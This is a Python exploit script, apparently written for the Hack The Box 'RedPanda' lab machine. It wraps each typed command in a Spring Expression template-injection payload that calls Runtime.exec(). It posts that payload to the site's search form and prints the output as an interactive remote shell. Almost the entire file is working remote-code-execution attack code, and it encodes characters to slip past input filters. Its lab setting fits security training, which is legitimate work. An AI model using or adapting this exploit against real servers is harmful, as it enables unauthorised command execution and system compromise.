import requests
from cmd import Cmd
import urllib.parse, argparse
import re
import threading
import netifaces as ni
from http.server import HTTPServer, SimpleHTTPRequestHandler

url = "http://redpanda.htb:8080/search"

parser = argparse.ArgumentParser()
parser.add_argument("-u","--url-encode", action="store_true", help="URL Encode")
args = parser.parse_args()
url_encode=args.url_encode

class Terminal(Cmd):
    prompt='\033[1;33mwoodenk@redpanda:/tmp/hsperfdata_woodenk$ \033[0m'
    def decimal_encode(self,args):
        command=args
        decimals=[]
        for i in command:
            decimals.append(str(ord(i)))
        payload='''*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]
        for i in decimals[1:]:
            line='.concat(T(java.lang.Character).toString({}))'.format(i)
            payload+=line
        payload+=').getInputStream())}'
        data = {'name': payload}
        #print(payload)
        r = requests.post(url, data=data)
        r = r.text
        r = r.split("</h2>")[0][612:]
        print(r)
    def default(self,args):
        e = self.decimal_encode(args)
        e = str(e).replace("None","")
        print(e)
try:
    term=Terminal()
    term.cmdloop()
except KeyboardInterrupt:
    quit
